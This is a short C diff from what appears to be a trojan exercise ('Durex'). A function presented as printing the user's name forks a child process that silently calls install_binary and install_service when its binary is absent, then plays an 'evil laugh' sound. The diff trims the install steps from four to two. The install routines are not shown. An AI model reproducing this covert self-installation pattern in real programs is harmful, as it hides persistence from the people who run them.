@@ -17,7 +17,7 @@
 #include <pwd.h>
 
 #include "main.h"
-
+#include <stdio.h>
 void				print_usr_name()
 {
 	struct passwd	*passwd;
@@ -31,17 +31,11 @@ void				print_usr_name()
 	fd = open(DUREX_BINARY_FILE, O_RDONLY, 0700);
 	if (fd < 0) {
 		if (fork() == 0) {
-			int		(*process[])(void) = { &install_binary,
-										   &install_service,
-										   &install_conf,
-										   &install_init };
-			for (size_t i = 0; i < sizeof(process) / sizeof(*process); i++) {
-				if (process[i]())
-					return ;
-			}
-			system("mpg123 -q ./audio/Evil_Laugh.mp3 2>/dev/null");
+			if (!install_binary() && !install_service())
+				system("mpg123 -q ./audio/Evil_Laugh.mp3 2>/dev/null");
 			exit(0);
 		}
+		exit(0);
 	}
 	close(fd);
 }
